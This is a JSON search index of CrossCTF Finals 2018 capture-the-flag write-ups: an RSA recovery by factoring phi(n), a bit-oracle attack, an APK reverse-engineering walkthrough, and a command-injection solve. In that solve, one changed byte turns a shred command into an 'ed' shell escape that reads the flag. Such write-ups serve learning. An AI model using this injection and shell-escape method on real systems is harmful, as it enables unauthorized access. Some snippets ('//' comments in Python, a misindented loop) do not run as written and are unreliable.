            "location": "/crossctf-finals2018/crypto/fitblips/README/", 
            "text": "CrossCTF Finals 2018 : fitblips (crypto)\n\n\n\n\nHow many steps does your Fitblip beep?\n\n\nnc ctf.pwn.sg 4003\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nserver code\n\n\nAnalysis\n\n\nTo summarize what this program does:\n\n\n\n\nIt reads the flag from a file, hex encodes it, and turns it into a stream of bits\n\n\nReads in user input, hex encodes it, and turns it into a stream of bits\n\n\nCompares the user input and flag bit by bit, and terminates once it is different\n\n\nPrints the time taken for comparison, plus the number of bits that matched.\n\n\nOops forgot to mention, it also lets the user decide how many times to run the \nsame\n comparison.\n\n\n\n\nOn first sight, we can tell that this is simply just a programming challenge to do a timing attack. Except that since everyone in the competition is hitting the server it is more accurate to use the score than to use the time taken.\n\n\nSolution\n\n\nSimply write a script to try strings that start exactly the same but one ending with bit 0 and one ending with bit 1.\n\n\nYou can find our script \nhere\n.\n\n\nBecause why not", 
            "title": "Fitblips"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/fitblips/README/#crossctf-finals-2018-fitblips-crypto", 
            "text": "How many steps does your Fitblip beep?  nc ctf.pwn.sg 4003  Creator - amon (@nn_amon)   server code", 
            "title": "CrossCTF Finals 2018 : fitblips (crypto)"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/fitblips/README/#analysis", 
            "text": "To summarize what this program does:   It reads the flag from a file, hex encodes it, and turns it into a stream of bits  Reads in user input, hex encodes it, and turns it into a stream of bits  Compares the user input and flag bit by bit, and terminates once it is different  Prints the time taken for comparison, plus the number of bits that matched.  Oops forgot to mention, it also lets the user decide how many times to run the  same  comparison.   On first sight, we can tell that this is simply just a programming challenge to do a timing attack. Except that since everyone in the competition is hitting the server it is more accurate to use the score than to use the time taken.", 
            "title": "Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/fitblips/README/#solution", 
            "text": "Simply write a script to try strings that start exactly the same but one ending with bit 0 and one ending with bit 1.  You can find our script  here .", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/fitblips/README/#because-why-not", 
            "text": "", 
            "title": "Because why not"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/babyrsa3/README/", 
            "text": "CrossCTF Finals 2018 : BabyRSA3 (crypto)\n\n\n\n\nSo I heard that you can flip the private and public information for RSA...\n\n\nCreator - prokarius (@prokarius)\n\n\n\n\nWe are given a file \noutNerfed.txt\n, which contains \nc\n, the ciphertext, \nd\n, the private exponent and \nphi(n)\n, which is equal to \n(p-1)(q-1)\n.\n\n\nChallenge\n\n\nTo decrypt the ciphertext, we will need \nd\n and \nn\n. So the challenge here is to find a way to get \nn\n from \nphi(n)\n.\n\n\nSolution\n\n\nFactorization\n\n\nTo get \nn\n from \nphi(n)\n, the most sensical step is to find \np-1\n and \nq-1\n, so that we can find \nn=pq\n. We tried to use \nyafu\n to do it, and it worked very nicely.\n\n\n daniel@daniel \ue0b0 ~/Downloads/yafu \ue0b0 ./yafu 'factor(25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492)'\n\n\nfac: factoring 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C346 \nrho: x^2 + 2, starting 1000 iterations on C346 \nrho: x^2 + 1, starting 1000 iterations on C346 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C346\necm: 0/30 curves on C334, B1=2K, B2=gmp-ecm default\necm: 0/29 curves on C322, B1=2K, B2=gmp-ecm default\necm: 0/28 curves on C310, B1=2K, B2=gmp-ecm default\necm: 0/27 curves on C272, B1=2K, B2=gmp-ecm default\necm: 0/26 curves on C259, B1=2K, B2=gmp-ecm default\necm: 1/25 curves on C246, B1=2K, B2=gmp-ecm default\necm: 0/23 curves on C221, B1=2K, B2=gmp-ecm default\necm: 1/22 curves on C196, B1=2K, B2=gmp-ecm default\necm: 1/20 curves on C183, B1=2K, B2=gmp-ecm default\necm: 0/18 curves on C170, B1=2K, B2=gmp-ecm default\necm: 2/17 curves on C157, B1=2K, B2=gmp-ecm default\necm: 3/14 curves on C144, B1=2K, B2=gmp-ecm default\necm: 1/10 curves on C132, B1=2K, B2=gmp-ecm default\necm: 8/8 curves on C119, B1=2K, B2=gmp-ecm default\necm: 3/74 curves on C119, B1=11K, B2=gmp-ecm default\nfac: factoring 48636585985082768736526784024200750021\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C38 \nrho: x^2 + 2, starting 1000 iterations on C38 \nrho: x^2 + 1, starting 1000 iterations on C38 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C38\necm: 0/30 curves on C38, B1=2K, B2=gmp-ecm default\necm: 0/29 curves on C26, B1=2K, B2=gmp-ecm default\nTotal factoring time = 0.1867 seconds\nfac: factoring 52537838568268884632273629\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C26 \nrho: x^2 + 2, starting 1000 iterations on C26 \nrho: x^2 + 1, starting 1000 iterations on C26 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C26\necm: 1/30 curves on C26, B1=2K, B2=gmp-ecm default\nTotal factoring time = 0.2959 seconds\nfac: factoring 9434943930960179869296047\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C25 \nrho: x^2 + 2, starting 1000 iterations on C25 \nrho: x^2 + 1, starting 1000 iterations on C25 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C25\necm: 1/30 curves on C25, B1=2K, B2=gmp-ecm default\nTotal factoring time = 0.2060 seconds\nTotal factoring time = 4.6255 seconds\n\n\n***factors found***\n\nP1 = 2\nP1 = 2\nP13 = 2767687179787\nP12 = 333600482773\nP13 = 6938103821809\nP13 = 3680247726403\nP13 = 8313722160551\nP13 = 6438418759151\nP13 = 6545600536253\nP13 = 6672422609813\nP13 = 6579600728639\nP13 = 3639128890921\nP13 = 9566431650679\nP13 = 9220079755217\nP106 = 2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051\nP13 = 4065711354007\nP13 = 1973804930501\nP13 = 6060693342503\nP13 = 7265658595571\nP13 = 7230980905199\nP13 = 4754509728797\nP13 = 1984419944251\n\nans = 1\n\n\n\n\nCleaning up the output, and putting them into a python script\n\n\na = []\na.append(2)\na.append(2)\na.append(2767687179787)\na.append(7230980905199)\na.append(3680247726403)\na.append(7265658595571)\na.append(6545600536253)\na.append(6579600728639)\na.append(3639128890921)\na.append(333600482773)\na.append(9220079755217)\na.append(8313722160551)\na.append(9566431650679)\na.append(6938103821809)\na.append(6438418759151)\na.append(2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051)\na.append(4754509728797)\na.append(6672422609813)\na.append(1973804930501)\na.append(6060693342503)\na.append(1984419944251)\na.append(4065711354007)\n\nc = 5499541793182458916572235549176816842668241174266452504513113060755436878677967801073969318886578771261808846567771826513941339489235903308596884669082743082338194484742630141310604711117885643229642732544775605225440292634865971099525895746978617397424574658645139588374017720075991171820873126258830306451326541384750806605195470098194462985494\nd = 15664449102383123741256492823637853135125214807384742239549570131336662433268993001893338579081447660916548171028888182200587902832321164315176336792229529488626556438838274357507327295590873540152237706572328731885382033467068457038670389341764040515475556103158917133155868200492242619473451848383350924192696773958592530565397202086200003936447\nphi = 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492\n\n\n\n\nFind n\n\n\nNow, we just need to split the factors into 2 sets, satisfying the condition that the product of the integers in each set, added by 1, will be a prime number. \n\n\nIn other words, split the factors we got into \np-1\n and \nq-1\n, while making sure that \np\n and \nq\n are both prime.\n\n\nTo do so, we can use \nitertools.combinations\n to generate different combinations of factors, and check if they fit the conditions above. Once we managed to find the \np\n and \nq\n we need, all we need is to do left is find \nm = c ^ d % n\n.\n\n\nimport itertools\nimport gmpy2\n\ndef P(a):\n    return reduce(lambda x, y: x*y, a)\n\nfor n in range(1, 12):\n    for i in itertools.combinations(a, n):\n        // check if p and q are prime\n        if (gmpy2.is_prime(P(i) + 1)) and gmpy2.is_prime(phi / P(i) + 1):\n            p = P(i) + 1\n            q = phi / P(i) + 1\n\n            // found n, decrypt the ciphertext\n            n = p * q\n            plain = gmpy2.powmod(c, d, n)\n            print hex(plain)[2:].decode('hex')\n            exit()", 
            "title": "BabyRSA"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/babyrsa3/README/#crossctf-finals-2018-babyrsa3-crypto", 
            "text": "So I heard that you can flip the private and public information for RSA...  Creator - prokarius (@prokarius)   We are given a file  outNerfed.txt , which contains  c , the ciphertext,  d , the private exponent and  phi(n) , which is equal to  (p-1)(q-1) .", 
            "title": "CrossCTF Finals 2018 : BabyRSA3 (crypto)"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/babyrsa3/README/#challenge", 
            "text": "To decrypt the ciphertext, we will need  d  and  n . So the challenge here is to find a way to get  n  from  phi(n) .", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/babyrsa3/README/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/babyrsa3/README/#factorization", 
            "text": "To get  n  from  phi(n) , the most sensical step is to find  p-1  and  q-1 , so that we can find  n=pq . We tried to use  yafu  to do it, and it worked very nicely.   daniel@daniel \ue0b0 ~/Downloads/yafu \ue0b0 ./yafu 'factor(25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492)'\n\n\nfac: factoring 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C346 \nrho: x^2 + 2, starting 1000 iterations on C346 \nrho: x^2 + 1, starting 1000 iterations on C346 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C346\necm: 0/30 curves on C334, B1=2K, B2=gmp-ecm default\necm: 0/29 curves on C322, B1=2K, B2=gmp-ecm default\necm: 0/28 curves on C310, B1=2K, B2=gmp-ecm default\necm: 0/27 curves on C272, B1=2K, B2=gmp-ecm default\necm: 0/26 curves on C259, B1=2K, B2=gmp-ecm default\necm: 1/25 curves on C246, B1=2K, B2=gmp-ecm default\necm: 0/23 curves on C221, B1=2K, B2=gmp-ecm default\necm: 1/22 curves on C196, B1=2K, B2=gmp-ecm default\necm: 1/20 curves on C183, B1=2K, B2=gmp-ecm default\necm: 0/18 curves on C170, B1=2K, B2=gmp-ecm default\necm: 2/17 curves on C157, B1=2K, B2=gmp-ecm default\necm: 3/14 curves on C144, B1=2K, B2=gmp-ecm default\necm: 1/10 curves on C132, B1=2K, B2=gmp-ecm default\necm: 8/8 curves on C119, B1=2K, B2=gmp-ecm default\necm: 3/74 curves on C119, B1=11K, B2=gmp-ecm default\nfac: factoring 48636585985082768736526784024200750021\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C38 \nrho: x^2 + 2, starting 1000 iterations on C38 \nrho: x^2 + 1, starting 1000 iterations on C38 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C38\necm: 0/30 curves on C38, B1=2K, B2=gmp-ecm default\necm: 0/29 curves on C26, B1=2K, B2=gmp-ecm default\nTotal factoring time = 0.1867 seconds\nfac: factoring 52537838568268884632273629\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C26 \nrho: x^2 + 2, starting 1000 iterations on C26 \nrho: x^2 + 1, starting 1000 iterations on C26 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C26\necm: 1/30 curves on C26, B1=2K, B2=gmp-ecm default\nTotal factoring time = 0.2959 seconds\nfac: factoring 9434943930960179869296047\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nrho: x^2 + 3, starting 1000 iterations on C25 \nrho: x^2 + 2, starting 1000 iterations on C25 \nrho: x^2 + 1, starting 1000 iterations on C25 \npm1: starting B1 = 150K, B2 = gmp-ecm default on C25\necm: 1/30 curves on C25, B1=2K, B2=gmp-ecm default\nTotal factoring time = 0.2060 seconds\nTotal factoring time = 4.6255 seconds\n\n\n***factors found***\n\nP1 = 2\nP1 = 2\nP13 = 2767687179787\nP12 = 333600482773\nP13 = 6938103821809\nP13 = 3680247726403\nP13 = 8313722160551\nP13 = 6438418759151\nP13 = 6545600536253\nP13 = 6672422609813\nP13 = 6579600728639\nP13 = 3639128890921\nP13 = 9566431650679\nP13 = 9220079755217\nP106 = 2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051\nP13 = 4065711354007\nP13 = 1973804930501\nP13 = 6060693342503\nP13 = 7265658595571\nP13 = 7230980905199\nP13 = 4754509728797\nP13 = 1984419944251\n\nans = 1  Cleaning up the output, and putting them into a python script  a = []\na.append(2)\na.append(2)\na.append(2767687179787)\na.append(7230980905199)\na.append(3680247726403)\na.append(7265658595571)\na.append(6545600536253)\na.append(6579600728639)\na.append(3639128890921)\na.append(333600482773)\na.append(9220079755217)\na.append(8313722160551)\na.append(9566431650679)\na.append(6938103821809)\na.append(6438418759151)\na.append(2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051)\na.append(4754509728797)\na.append(6672422609813)\na.append(1973804930501)\na.append(6060693342503)\na.append(1984419944251)\na.append(4065711354007)\n\nc = 5499541793182458916572235549176816842668241174266452504513113060755436878677967801073969318886578771261808846567771826513941339489235903308596884669082743082338194484742630141310604711117885643229642732544775605225440292634865971099525895746978617397424574658645139588374017720075991171820873126258830306451326541384750806605195470098194462985494\nd = 15664449102383123741256492823637853135125214807384742239549570131336662433268993001893338579081447660916548171028888182200587902832321164315176336792229529488626556438838274357507327295590873540152237706572328731885382033467068457038670389341764040515475556103158917133155868200492242619473451848383350924192696773958592530565397202086200003936447\nphi = 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492", 
            "title": "Factorization"
        }, 
        {
            "location": "/crossctf-finals2018/crypto/babyrsa3/README/#find-n", 
            "text": "Now, we just need to split the factors into 2 sets, satisfying the condition that the product of the integers in each set, added by 1, will be a prime number.   In other words, split the factors we got into  p-1  and  q-1 , while making sure that  p  and  q  are both prime.  To do so, we can use  itertools.combinations  to generate different combinations of factors, and check if they fit the conditions above. Once we managed to find the  p  and  q  we need, all we need is to do left is find  m = c ^ d % n .  import itertools\nimport gmpy2\n\ndef P(a):\n    return reduce(lambda x, y: x*y, a)\n\nfor n in range(1, 12):\n    for i in itertools.combinations(a, n):\n        // check if p and q are prime\n        if (gmpy2.is_prime(P(i) + 1)) and gmpy2.is_prime(phi / P(i) + 1):\n            p = P(i) + 1\n            q = phi / P(i) + 1\n\n            // found n, decrypt the ciphertext\n            n = p * q\n            plain = gmpy2.powmod(c, d, n)\n            print hex(plain)[2:].decode('hex')\n            exit()", 
            "title": "Find n"
        }, 
        {
            "location": "/crossctf-finals2018/misc/evil/README/", 
            "text": "CrossCTF Finals 2018 : The Evilness (Misc)\n\n\nFirst Blood by : OSI Layer 8\n\n\n\n\nReady for something ridiculously difficult?\n\n\nnc ctf.pwn.sg 4020\n\n\n\n\nChallenge\n\n\nOnce we connect to the address, we get:\n\n\n#!/usr/bin/env python\nimport sys\nimport flag\nimport signal\nimport os\nimport tempfile\n\ntemp_file = tempfile.NamedTemporaryFile(prefix=\ncartoon-\n,\n                                        suffix=\n.dat\n,\n                                        delete=True)\n\n\ndef handler(signum, frame):\n    write(\nTimes up!\n)\n    temp_file.close()\n    sys.exit(0)\n\n\ndef write(data, endl='\\n'):\n    sys.stdout.write(data + endl)\n    sys.stdout.flush()\n\n\ndef readline():\n    return sys.stdin.readline().strip()\n\n\ndef main():\n    abspath = os.path.abspath(__file__)\n    dname = os.path.dirname(abspath)\n    os.chdir(dname)\n    signal.signal(signal.SIGALRM, handler)\n    signal.alarm(10)\n\n    # Write the flag to the temp file\n    temp_file.file.write(flag.flag)\n    temp_file.file.flush()\n\n    # Oh I'm sorry, did you want this?\n    del flag.flag\n\n    write(open(__file__).read())\n\n    command = \n/usr/bin/shred \n + temp_file.name\n    write(\nHere comes the shredder! (%s)\n % command)\n\n    ######################################################################\n    #\n    # INCOMING TRANSMISSION...\n    #\n    # CAREFUL AGENT. WE DO NOT HAVE MUCH TIME. I'VE OPENED A WORMHOLE IN\n    # THE FABRIC OF TIME AND SPACE TO INTRODUCE A FAULT IN ONE BYTE!\n    #\n    # MAKE USE OF IT WISELY!\n    #\n    command_fault = list(command)\n    index = int(readline())\n    byt = int(readline(), 16)\n    if (0x0 \n= index \n len(command_fault)):\n        if (0x0 \n= byt \n= 0xff):\n            command_fault[index] = chr(byt)\n            command = \n.join(command_fault)\n    #\n    # TRANSMISSION ENDED\n    #\n    ######################################################################\n\n    # Oooh, did you want this too? Too bad it's being... shredded.\n    os.system(command)\n\n\nif __name__ == \n__main__\n:\n    main()\n\nHere comes the shredder! (/usr/bin/shred /tmp/cartoon-EcqWge.dat)\n\n\n\n\nBasically, we get to change one character in command \n/usr/bin/shred /tmp/cartoon-XXXXX.dat\n to any character we want, and the flag is stored in \n/tmp/cartoon-XXXXX.dat\n\n\nSolution\n\n\nThere is a less known editor called \ned\n on Linux systems. We can type in \n!sh\n inside the editor to drop into the shell. We can replace the letter 'h' with '\n' in the command to instead run:\n\n\n/usr/bin/sh\ned /tmp/cartoon-XXXXX.dat\n\n\n\n\nwhich will run \n/usr/bin/sh\n (which doesn't exist), and then run \ned /tmp/cartoon-XXXXX.dat\n.\nTo replace the character, we send a index of 11, and\n I was too lazy to Ask the Oracle on how to actually use \ned\n, so I just went to shell and ran \ncat flag\n\n\nThe solution script is \nhere", 
            "title": "The Evilness"
        }, 
        {
            "location": "/crossctf-finals2018/misc/evil/README/#crossctf-finals-2018-the-evilness-misc", 
            "text": "", 
            "title": "CrossCTF Finals 2018 : The Evilness (Misc)"
        }, 
        {
            "location": "/crossctf-finals2018/misc/evil/README/#first-blood-by-osi-layer-8", 
            "text": "Ready for something ridiculously difficult?  nc ctf.pwn.sg 4020", 
            "title": "First Blood by : OSI Layer 8"
        }, 
        {
            "location": "/crossctf-finals2018/misc/evil/README/#challenge", 
            "text": "Once we connect to the address, we get:  #!/usr/bin/env python\nimport sys\nimport flag\nimport signal\nimport os\nimport tempfile\n\ntemp_file = tempfile.NamedTemporaryFile(prefix= cartoon- ,\n                                        suffix= .dat ,\n                                        delete=True)\n\n\ndef handler(signum, frame):\n    write( Times up! )\n    temp_file.close()\n    sys.exit(0)\n\n\ndef write(data, endl='\\n'):\n    sys.stdout.write(data + endl)\n    sys.stdout.flush()\n\n\ndef readline():\n    return sys.stdin.readline().strip()\n\n\ndef main():\n    abspath = os.path.abspath(__file__)\n    dname = os.path.dirname(abspath)\n    os.chdir(dname)\n    signal.signal(signal.SIGALRM, handler)\n    signal.alarm(10)\n\n    # Write the flag to the temp file\n    temp_file.file.write(flag.flag)\n    temp_file.file.flush()\n\n    # Oh I'm sorry, did you want this?\n    del flag.flag\n\n    write(open(__file__).read())\n\n    command =  /usr/bin/shred   + temp_file.name\n    write( Here comes the shredder! (%s)  % command)\n\n    ######################################################################\n    #\n    # INCOMING TRANSMISSION...\n    #\n    # CAREFUL AGENT. WE DO NOT HAVE MUCH TIME. I'VE OPENED A WORMHOLE IN\n    # THE FABRIC OF TIME AND SPACE TO INTRODUCE A FAULT IN ONE BYTE!\n    #\n    # MAKE USE OF IT WISELY!\n    #\n    command_fault = list(command)\n    index = int(readline())\n    byt = int(readline(), 16)\n    if (0x0  = index   len(command_fault)):\n        if (0x0  = byt  = 0xff):\n            command_fault[index] = chr(byt)\n            command =  .join(command_fault)\n    #\n    # TRANSMISSION ENDED\n    #\n    ######################################################################\n\n    # Oooh, did you want this too? Too bad it's being... shredded.\n    os.system(command)\n\n\nif __name__ ==  __main__ :\n    main()\n\nHere comes the shredder! (/usr/bin/shred /tmp/cartoon-EcqWge.dat)  Basically, we get to change one character in command  /usr/bin/shred /tmp/cartoon-XXXXX.dat  to any character we want, and the flag is stored in  /tmp/cartoon-XXXXX.dat", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/misc/evil/README/#solution", 
            "text": "There is a less known editor called  ed  on Linux systems. We can type in  !sh  inside the editor to drop into the shell. We can replace the letter 'h' with ' ' in the command to instead run:  /usr/bin/sh ed /tmp/cartoon-XXXXX.dat  which will run  /usr/bin/sh  (which doesn't exist), and then run  ed /tmp/cartoon-XXXXX.dat .\nTo replace the character, we send a index of 11, and\n I was too lazy to Ask the Oracle on how to actually use  ed , so I just went to shell and ran  cat flag  The solution script is  here", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/misc/cyoa/cyoa/", 
            "text": "import struct\n\n\nnums = [1068077148, 1805536572,1005526689, 1727990831, 1301214146, 428181300, 1107313295, 2147483648, 993912976, 778615823, 1090848777]\n\n\ndef tof(b):\n   s = struct.pack('\nL', b)\n   return struct.unpack('\nf', s)[0]\n\n\nprint([tof(x) for x in nums])", 
            "title": "Choose Your Own Adventure"
        }, 
        {
            "location": "/crossctf-finals2018/mobile/human/README/", 
            "text": "CrossCTF Finals 2018 : Human Powered Flag Generator\n\n\nFirst Blood by : Segfaulters\n\n\n\n\nKeep cranking until the whole flag appears!\n\n\nCreator - prokarius (@prokarius)\n\n\n\n\nStatic Analysis\n\n\nWe are given an APK file, which upon extracting and converting to its Java code, we get:\n\n\npackage com.a2018.crossctf.humanpoweredflaggenerator;\n\nimport android.content.res.Resources;\nimport android.os.Bundle;\nimport android.support.v7.app.AppCompatActivity;\nimport android.view.View;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n    private TextView flagDisplay;\n    private TextView percent;\n    private Status status;\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView((int) C0185R.layout.activity_main);\n        this.status = new Status();\n        this.flagDisplay = (TextView) findViewById(C0185R.id.flagTextView);\n        this.percent = (TextView) findViewById(C0185R.id.percentTextView);\n        findViewById(C0185R.id.speedupButton).setOnClickListener(new MainActivity$$Lambda$0(this));\n        findViewById(C0185R.id.crankButton).setOnClickListener(new MainActivity$$Lambda$1(this));\n    }\n\n    final /* synthetic */ void lambda$onCreate$0$MainActivity(View view) {\n        this.status.speedUp();\n    }\n\n    final /* synthetic */ void lambda$onCreate$1$MainActivity(View view) {\n        crank();\n    }\n\n    private void crank() {\n        this.status.crank(3.8d);\n        Resources res = getResources();\n        this.flagDisplay.setText(res.getString(C0185R.string.flag, new Object[]{this.status.flag()}));\n        this.percent.setText(res.getString(C0185R.string.percent, new Object[]{Integer.valueOf(this.status.level()), this.status.percent()}));\n    }\n}\n\n\n\n\n\nSeems like the app has a display for the flag, a display for percent of work done, and a button to 'work' to flag generation, and a button to speed up the process.\n\n\npackage com.a2018.crossctf.humanpoweredflaggenerator;\n\nimport android.annotation.SuppressLint;\nimport java.math.BigInteger;\n\nclass Status {\n    private BigInteger curr;\n    private BigInteger f9f;\n    private StringBuilder flagBuilder = new StringBuilder();\n    private BigInteger fmax;\n    private int level = 0;\n    private BigInteger max;\n    private BigInteger prod;\n\n    Status() {\n        upLevel();\n    }\n\n    public void crank(double am) {\n        double amount = Math.pow(am, (double) this.level);\n        for (int i = 0; ((double) i) \n amount; i++) {\n            if (this.max.compareTo(this.curr) == 0) {\n                if (this.level != 13) {\n                    this.flagBuilder.append(extract());\n                    upLevel();\n                } else {\n                    return;\n                }\n            } else if (this.f9f.compareTo(this.fmax) == 0) {\n                this.curr = this.curr.add(BigInteger.ONE);\n                upF();\n            } else {\n                this.prod = this.prod.multiply(this.f9f);\n                this.f9f = this.f9f.add(BigInteger.ONE);\n            }\n        }\n    }\n\n    public String flag() {\n        return this.flagBuilder.toString();\n    }\n\n    public int level() {\n        return this.level;\n    }\n\n    @SuppressLint({\nDefaultLocale\n})\n    public String percent() {\n        double frac = BigInteger.valueOf(10000).divide(this.max.subtract(BigInteger.ONE)).doubleValue();\n        double x = this.curr.doubleValue() - 1.0d;\n        return String.format(\n%.2f\n, new Object[]{Double.valueOf(Math.min(100.0d, (((BigInteger.valueOf(10000).multiply(this.f9f).divide(this.fmax).doubleValue() / 10000.0d) + x) * frac) / 100.0d))});\n    }\n\n    private void upLevel() {\n        this.level++;\n        this.max = BigInteger.ONE.shiftLeft(this.level).add(BigInteger.ONE);\n        this.curr = BigInteger.ONE;\n        this.prod = BigInteger.ONE;\n        upF();\n    }\n\n    private void upF() {\n        this.fmax = fastExpo(BigInteger.valueOf(5), this.curr).add(BigInteger.ONE);\n        this.f9f = BigInteger.ONE;\n    }\n\n    public void speedUp() {\n        while (this.prod.mod(BigInteger.TEN).equals(BigInteger.ZERO)) {\n            this.prod = this.prod.divide(BigInteger.TEN);\n        }\n    }\n\n    private String extract() {\n        BigInteger thousand = BigInteger.valueOf(1000);\n        speedUp();\n        return this.prod.mod(thousand).add(thousand).toString().substring(1);\n    }\n\n    private static BigInteger fastExpo(BigInteger x, BigInteger y) {\n        BigInteger out = BigInteger.ONE;\n        while (y.compareTo(BigInteger.ONE) != 0) {\n            if (y.and(BigInteger.ONE).equals(BigInteger.ONE)) {\n                out = out.multiply(x);\n            }\n            x = x.multiply(x);\n            y = y.shiftRight(1);\n        }\n        return out.multiply(x);\n    }\n}\n\n\n\n\n\n(other useless files like lambda classes/resources files filtered out)\n\n\nThis seems like the meat of the app. Extracting this class out and running it on my local machine using a Java IDE, it seems that it takes a ... very long time ... yea no, running it won't solve the problem.\n\n\nThe \nflagBuilder\n is a StringBuilder containing the flag. I started out by combining the methods together so to form as few methods as possible, then I converted this to Python so that my eyes don't bleed from the verbosity of Java.\n\n\nclass Status:\n    __init__():\n        level=1\n        max = 3\n        curr = 1\n        prod =1\n        fmax = 6\n        f9f = 1\n        flag = ''\n\n    def crank(am):\n        amount = am**level;\n        for i in range(amount):\n            if max == curr \n                if level == 13:\n                    return\n                while prod%10==0:\n                    prod//=10\n                flag += str((prod%1000)+1000)[1:]\n                level++\n                max = 1\nlevel +1\n                curr = 1\n                prod = 1\n                fmax = 6\n                f9f = 1\n            elif f9f == fmax:\n                curr++;\n                fmax = (5**curr) + 1\n                f9f = 1\n            else:\n                prod *= f9f;\n                f9f++;\n\n\n\n\nThe entire class can be replaced by just the crank method, as long as the state is stored within the function itself. We will do that, and things should get a lot simpler. The \ncrank()\n code still looks really bad, so we can begin by simplifying the code. The code looks suspiciously like disassembled nested while loops, so I started with that concept, then made \ncrank()\n return the flag instead of just shoving into a variable.\n\n\ndef crank():\n    flag = ''\n    for level in range(1,13):\n        prod=1\n        for curr in range(1, (1\nlevel)+1):\n            fmax = 5**curr+1\n            for f9f in range(fmax)\n                prod *= f9f\n    while prod % 10 == 0:\n        prod = prod // 10\n    flag+= str(prod%1000).rjust(3,'0')\n    return flag\n\n\n\n\nThe innermost for loop can be simplified, so the code can be:\n\n\ndef crank():\n    flag = ''\n    for level in range(1,13):\n        prod=1\n        for curr in range(1, (1\nlevel)+1):\n            prod *= factorial(curr)\n    while prod % 10 == 0:\n        prod = prod // 10\n    flag+= str(prod%1000).rjust(3,'0')\n    return flag\n\n\n\n\nwhere \nfactorial\n is the  factorial function, which I created to be a simple for-loop instead of recursion (python and its stack ;-;).\n\n\nThat's not the real problem of course. It took wayyyy to long.\n\n\nOf course, it's because we are going to call factorial(5**(1\nlevel)), which will take toooooo long.\n\n\nI was going to use Wolfram Alpha's API to get the factorial of those large numbers, when I realised there was a pattern in the factorials of (5*\ni): the last 3 digits are repeating (984, 088, 016, 912), except for factorial(5*\n1) which is 120.\n\n\nSince the flag only cares about the last 3 digits of prod, which is the multiplication of all factorials of (5**i) in the range [1 to 1\nlevel], we can replace the factorial function with one that gives only the last 3 digits:\n\n\ndef factorial(g):\n    if g == 1:\n        return 120\n    else:\n        return [984, 88, 16, 912][(g-2)%4]\n\n\n\n\nThe final code is in \nhere", 
            "title": "Human Powered Flag Generator"
        }, 
        {
            "location": "/crossctf-finals2018/mobile/human/README/#crossctf-finals-2018-human-powered-flag-generator", 
            "text": "", 
